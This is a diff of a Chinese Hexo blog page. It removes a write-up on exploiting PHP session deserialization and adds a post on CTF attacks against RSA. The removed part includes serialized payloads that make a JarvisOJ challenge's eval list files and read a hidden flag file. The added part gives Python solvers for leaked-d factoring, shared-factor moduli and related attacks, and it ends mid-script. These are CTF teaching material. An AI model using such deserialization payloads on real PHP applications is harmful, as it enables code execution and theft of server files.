@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Session_unserlize | Hexo</title>
-  <meta name="keywords" content=" serialize , php ">
-  <meta name="description" content="Session_unserlize | Hexo">
+  <title>RSA | Hexo</title>
+  <meta name="keywords" content=" RSA ">
+  <meta name="description" content="RSA | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="session的反序列化利用">
 <meta name="keywords" content="serialize,php">
@@ -426,9 +426,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-session_unserialize" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-RSA" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Session_unserlize</h1>
+        <h1 class="article-title">RSA</h1>
     
     <div class="article-meta">
         
@@ -436,23 +436,21 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="serialize">serialize</a>
+                <a href="javascript:" data-rel="RSA">RSA</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">serialize</a>
-            
-            <a href="javascript:" class="color4">php</a>
+            <a href="javascript:" class="color4">RSA</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-01 19:53:15'>2019-08-01 19:33</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-01 19:52:48'>2018-05-23 15:13</time>
         
     </div>
     <div class="article-meta">
@@ -474,7 +472,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#对魔法函数的再次认识"><span class="toc-text">对魔法函数的再次认识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用方法"><span class="toc-text">常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#序列化机制"><span class="toc-text">序列化机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-text">__toString()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-反序列化"><span class="toc-text">session 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#设置session序列化方法可能带来的隐患"><span class="toc-text">设置session序列化方法可能带来的隐患</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-upload-progress"><span class="toc-text">session.upload_progress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-text">phpinfo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#模数相关攻击"><span class="toc-text">模数相关攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#d泄露攻击"><span class="toc-text">d泄露攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wiener’s-Attack"><span class="toc-text">Wiener’s Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模不互素"><span class="toc-text">模不互素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#共模攻击"><span class="toc-text">共模攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小公钥指数攻击"><span class="toc-text">小公钥指数攻击</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -489,207 +487,203 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>session的反序列化利用</p>
+        <p>我才二十出头，为什么要承受这么多…</p>
 <a id="more"></a>
-<p>8/1/2019 10:44:57 AM </p>
-<h2 id="对魔法函数的再次认识"><a href="#对魔法函数的再次认识" class="headerlink" title="对魔法函数的再次认识"></a>对魔法函数的再次认识</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><pre><code>__construct()//创建对象时触发
-__destruct() //对象被销毁时触发
-__call() //在对象上下文中调用不可访问的方法时触发
-__callStatic() //在静态上下文中调用不可访问的方法时触发
-__get() //用于从不可访问的属性读取数据
-__set() //用于将数据写入不可访问的属性
-__isset() //在不可访问的属性上调用isset()或empty()触发
-__unset() //在不可访问的属性上使用unset()时触发
-__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h4><pre><code>String
-s:size:value;
-Integer
-i:value;
-Boolean
-b:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &#39;1&#39; or &#39;0&#39;)
-Null
-N;
-Array
-a:size:{key definition;value definition;(repeated per element)}
-Object
-O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
-<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并<strong>返回一个包含对象中所有应被序列化的变量名称的数组</strong>。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
-</blockquote>
-<p>也就是说序列化时没有被利用到的属性会被清理。</p>
-<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote>
-<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
-</blockquote>
-<p>也就是说会在<code>unserilize</code>之前准备好可能会用到的对象资源</p>
-<p>拿<a href="https://xz.aliyun.com/t/3674#toc-5" title="师傅博客" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-5</a>师傅文章的代码做个例子：</p>
-<pre><code>&lt;?php 
-class Caiji{
-public function __construct($ID, $sex, $age){
-$this-&gt;ID = $ID;
-$this-&gt;sex = $sex;
-$this-&gt;age = $age;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
 
-public function getInfo(){
-echo $this-&gt;info . &#39;&lt;br&gt;&#39;;
-}
-/**
- * serialize前调用 用于删选需要被序列化存储的成员变量
- * @return array [description]
- */
-public function __sleep(){
-echo __METHOD__ . &#39;&lt;br&gt;&#39;;
-return [&#39;ID&#39;, &#39;sex&#39;, &#39;age&#39;];
-}
+<p>pubkey.pem文件构成</p>
+<p>Jarvis OJ mediumRSA为例</p>
+<p>下载文件我们得到了flag.enc和pubkey.pem，<br>使用openssl来获取公钥信息</p>
+<pre><code>root@kali-ctf:~/RSA/mediumRSA# openssl rsa -pubin -in pubkey.pem -text -modulus
+Public-Key: (256 bit)
+Modulus:
+00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
+1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
+be:30:dd
+Exponent: 65537 (0x10001)
+Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
+yigb/+l/vjDdAgMBAAE=
+-----END PUBLIC KEY-----</code></pre><p>这里的Exponent：65537(0x10001) 即为e.</p>
+<p>Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 即为N.</p>
+<p>这里通过看<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html" title="大佬博客" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html</a>简单说一下pem文件组成。</p>
+<p>简单来讲，pem文件就是用于ASCII(Base64)编码的各种X.509 v3证书。</p>
+<p>文件由BEGIN开始，END结束。文件内容要根据base64编码解码之后，得到的数据进行增加或删减特殊字符等。</p>
+<p>接着上面的题目，我们已经知道了n,e，接着去factor分解N得到p,q，生成私钥后解密flag.enc文件。</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import gmpy2
+from Crypto.Util.number import long_to_bytes
 
-/**
- * unserialize前调用 用于预先准备对象资源
- */
-public function __wakeup(){
-echo __METHOD__ . &#39;&lt;br&gt;&#39;;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-}
-
-$me = new Caiji(&#39;Luc1fer&#39;, 20, &#39;male&#39;);
-
-$me-&gt;getInfo();
-//存在__sleep(函数，$info属性不会被存储
-$temp = serialize($me);
-echo $temp . &#39;&lt;br&gt;&#39;;
-
-$me = unserialize($temp);
-//__wakeup()组装的$info
-$me-&gt;getInfo();
-
-?&gt;</code></pre><p>执行结果如下 ：</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg" alt="魔法函数执行结果"></p>
-<p>如果看不太清楚函数的用法，我们可以再改一下代码看看效果，我们这次注释掉了<code>__sleep()</code>函数，并且在其他函数里增加了提示语句：</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg" alt="修改之后的效果"></p>
-<p>可以看到因为<code>sleep</code>的存在，<code>info</code>属性被删除，导致<code>getinfo()</code>使用时无法打印<code>Info</code>属性，在我们注释掉<code>sleep</code>之后，所有的属性都正常打印了，<code>wakeup</code>也是如此。</p>
-<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote>
-<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR 级别的致命错误。</p>
-</blockquote>
-<pre><code>&lt;?php 
-class Caiji{
-public function __construct($ID, $sex, $age){
-$this-&gt;ID = $ID;
-$this-&gt;sex = $sex;
-$this-&gt;age = $age;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-
-public function __toString(){
-return $this-&gt;info;
-}
-}
-
-$me = new Caiji(&#39;twosmi1e&#39;, 20, &#39;male&#39;);
-echo &#39;__toString:&#39; . $me . &#39;&lt;br&gt;&#39;;
-?&gt;
-
-__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id="session-反序列化"><a href="#session-反序列化" class="headerlink" title="session 反序列化"></a>session 反序列化</h2><p>PHP在session存储和读取时都会有一个序列化和反序列化的过程，php内置了多种处理器用于存取$_SESSION数据，对数据进行序列化与反序列化。</p>
-<p>这是php.ini中的配置项</p>
-<p><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png" alt="phpinfo配置"><br><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png" alt></p>
+p = 275127860351348928173285174381581152299
+q = 319576316814478949870590164193048041239
+n = 87924348264132406875276140514499937145050893665602592992418171647042491658461
+e = 65537
+d = gmpy2.invert(e, (p - 1) * (q - 1))
+with open(&#39;flag.enc&#39;, &#39;r&#39;) as f:
+        c = f.read().encode(&#39;hex&#39;)
+        c = int(c, 16)
+m = pow(c, d, n)
+print long_to_bytes(m)</code></pre><p>这里再说一下openssl</p>
 <ul>
-<li><code>session.save_path</code> 设置session的存储路径</li>
-<li><code>session.save_handler</code> 设定用户自定义存储函数</li>
-<li><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</li>
-<li><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</li>
+<li><p>查看公钥文件 </p>
+</li>
+<li><p>  openssl rsa -pubin -in pubkey.pem -text -modulus</p>
+</li>
+<li><p>解密</p>
+</li>
+<li><p><code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag</code></p>
+</li>
 </ul>
-<p>对于处理器，常用的有三种，对应三种不同的处理格式</p>
-<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg" alt="处理器的处理方式"></p>
-<p>我们可以看看不同储存方式储存的区别：</p>
-<p>选择不同的处理器来生成session，生成的文件就储存在上图对应目录中</p>
-<pre><code>&lt;?
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
+<h2 id="模数相关攻击"><a href="#模数相关攻击" class="headerlink" title="模数相关攻击"></a>模数相关攻击</h2><h3 id="d泄露攻击"><a href="#d泄露攻击" class="headerlink" title="d泄露攻击"></a>d泄露攻击</h3><p><a href="http://www.ams.org/notices/199902/boneh.pdf" title="原理看这篇paper" target="_blank" rel="noopener">http://www.ams.org/notices/199902/boneh.pdf</a> </p>
+<p>题目参考西湖论剑线下赛RSA</p>
+<p>chall.py</p>
+<pre><code>    from gmpy2 import invert
+from md5 import md5
+from secret import p, q
 
-$_SESSION[&#39;name&#39;] = &#39;Luc1fer&#39;;
+e = 65537
+n = p*q
+phi = (p-1)*(q-1)
+d = invert(e, phi)
 
-?&gt;
+print n, e, d
+print &quot;Flag: flag{%s}&quot; %md5(str(p + q)).hexdigest()</code></pre><p>output</p>
+<pre><code>n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309
+e= 65537 
+d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453
+Flag: flag{xxxx}</code></pre><p>d 泄露之后我们可以解密所有加密的消息，还可以对模数进行分解，脚本如下</p>
+<pre><code>import random
+def gcd(a, b):
+if a &lt; b:
+    a, b = b, a
+while b != 0:
+    temp = a % b
+    a = b
+    b = temp
+return a
 
-php_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}
-php: name|s:7:&quot;Luc1fer&quot;;
-php_binary: **EOT**names:7:&quot;Luc1fer&quot;;</code></pre><p>如果<strong>PHP在反序列化存储的$_SESSION数据时使用的处理器和序列化使用的处理器不同</strong>，会导致数据无法正确反序列化，通过特殊构造甚至可以伪造任意数据。</p>
-<h3 id="设置session序列化方法可能带来的隐患"><a href="#设置session序列化方法可能带来的隐患" class="headerlink" title="设置session序列化方法可能带来的隐患"></a>设置session序列化方法可能带来的隐患</h3><p>如果我们创建一个写入session的脚本</p>
-<pre><code>&lt;?php
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-name = _GET[&#39;name&#39;] ? _GET[&#39;name&#39;] : &quot;name&quot;; value = _GET[&#39;value&#39;] ? _GET[&#39;value&#39;] : &quot;value&quot;;
-_SESSION[name] = value;  if(isset(_GET[&#39;clean&#39;])) session_destroy();</code></pre><p>此时我们传入<code>value=|s:5:&quot;hack!&quot;;</code>,在进行session存储时的内容就会变成：<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.我们可以知道在<code>php\_serialize</code>中<code>a</code>代表一个数组，包含一个元素，但是如果其他的php页面没有设置处理器为<code>php\_serialize</code>而使用默认的php，那么在php解释session中的内容时，<code>|</code>前的部分会被解释称键，后的部分会被解释成值，在这里我们传入的<code>s:5:&quot;hack!&quot;;</code>会被解析成<code>hack!&quot;</code>，后面的<code>&quot;;</code>会被忽略。,最后解析的结果就是<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>。</p>
-<p>我们可以通过此来利用反序列化漏洞。</p>
-<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><blockquote>
-<p>Session 上传进度 </p>
-</blockquote>
-<blockquote>
-<p>当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p>
-</blockquote>
-<blockquote>
-<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得。</p>
-</blockquote>
-<p>在POST一个文件前，通过<code>POST</code>一个name为<code>Session.upload_progress</code>，value为用户自定义的一个upload_id。在文件上传过程中会生成上传信息。在上传结束后session中的键值对会直接消失。</p>
-<p>同时还要注意<code>session.upload_progress.cleanup</code>这个参数，这个选项的意思是在上传完成时从session中清除上传进度信息，默认开启。在关闭后上传信息会一直保存在session中。</p>
-<p>通过上面两部分我们可以更改session为自定义数据。</p>
-<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
-<pre><code>&lt;?php
-//A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
-session_start();
-class OowoO
-{
-    public $mdzz;
-    function __construct()
-    {
-        $this-&gt;mdzz = &#39;phpinfo();&#39;;
-    }
+def getpq(n,e,d):
+p = 1
+q = 1
+while p==1 and q==1:
+    k = d * e - 1
+    g = random.randint ( 0 , n )
+    while p==1 and q==1 and k % 2 == 0:
+        k /= 2
+        y = pow(g,k,n)
+        if y!=1 and gcd(y-1,n)&gt;1:
+            p = gcd(y-1,n)
+            q = n/p
+print p,q
 
-    function __destruct()
-    {
-        eval($this-&gt;mdzz);
-    }
-}
-if(isset($_GET[&#39;phpinfo&#39;]))
-{
-    $m = new OowoO();
-}
-else
-{
-    highlight_string(file_get_contents(&#39;index.php&#39;));
-}
-?&gt;</code></pre><p>观察到题目phpinfo中的配置</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p>
-<p>构造一个POST页面</p>
-<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
-&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
-&lt;input type=&quot;submit&quot; /&gt;
-&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。</p>
-<p>然后进行序列化。将处理器设置为<code>php_serialize</code></p>
-<pre><code>&lt;?php
-//A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-class OowoO
-{
-public $mdzz;
+def main():
+n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309
+e=65537
+d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453
+getpq(n,e,d)
+if __name__ == &#39;__main__&#39;:
+main()</code></pre><h3 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h3><p>当d比较小时，攻击者可以使用该攻击获取私钥。</p>
+<pre><code>#coding:utf-8
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
+import base64
 
-}
-$a = new OowoO();
-$a-&gt;mdzz = &#39;print_r(scandir(dirname(__FILE__)));&#39;;
-echo serialize($a);
-?&gt;</code></pre><p>得到</p>
-<pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了保持格式一致要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p>
-<p>读到如下信息</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p>
-<p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p>
-<p>于是我们修改mdzz的值为</p>
-<pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p>
-<pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>提交得到flag</p>
-<pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote>
-<p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p>
-<p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p>
-<p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p>
-</blockquote>
+flag=raw_input(&#39;flag:&#39;)
+key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))
+cipher = Cipher_pkcs1_v1_5.new(key)
+cipher_text = base64.b64encode(cipher.encrypt(flag))
+print cipher_text
+#cipher_text = &#39;AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q&#39;</code></pre><p>N,e都很大，使用脚本攻击<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
+<h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><p>2019强网杯后来的qwxf题</p>
+<pre><code>flag=open(&quot;flag&quot;,&quot;rb&quot;).read()
+
+from Crypto.Util.number import getPrime,bytes_to_long
+p=getPrime(1024)
+q=getPrime(1024)
+e=65537
+n=p*q
+m=bytes_to_long(flag)
+c=pow(m,e,n)
+print c,e,n
+
+p=getPrime(1024)
+e=65537
+n=p*q
+m=bytes_to_long(&quot;1&quot;*32)
+c=pow(m,e,n)
+print c,e,n
+
+output:
+2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597 
+65537 14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727
+3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470
+65537
+14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</code></pre><p>这里的N大到没法分解，但是两个N有公因数，就是p，通过求最大公因数得到p</p>
+<pre><code>def gcd(a, b):
+if a &lt; b:
+    a, b = b, a
+
+while b != 0:
+    temp = a % b
+    #print temp
+    a = b
+    b = temp
+
+return a</code></pre><p>之后也是常规解密</p>
+<p>再来个网上找的全套的</p>
+<pre><code>#  coding: utf-8
+from Crypto.PublicKey import RSA
+import gmpy2
+import codecs
+
+n1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203
+n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219
+c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560
+c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605
+e1=1804229351
+e2=17249876309
+
+q=gmpy2.gcd(n1,n2)
+p1=n1//q
+p2=n2//q
+
+d1=gmpy2.invert(e1,(p1-1)*(q-1))
+d2=gmpy2.invert(e2,(p2-1)*(q-1))
+
+while d1&lt;0:
+        d1+=(p1-1)*(q-1)
+while d2&lt;0:
+        d2+=(p2-1)*(q-1)
+m2=hex(pow(c2,d2,n2))[2:].replace(&quot;L&quot;,&quot;&quot;)
+m1=hex(pow(c1,d1,n1))[2:].replace(&quot;L&quot;,&quot;&quot;)
+
+if(len(m2)%2==1):
+        m2=&#39;0&#39;+m2
+if(len(m1)%2==1):
+    m1 =&#39;0&#39;+ m1
+print m1.decode(&#39;hex&#39;)
+print m2.decode(&#39;hex&#39;)</code></pre><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击。</p>
+<pre><code>import gmpy2
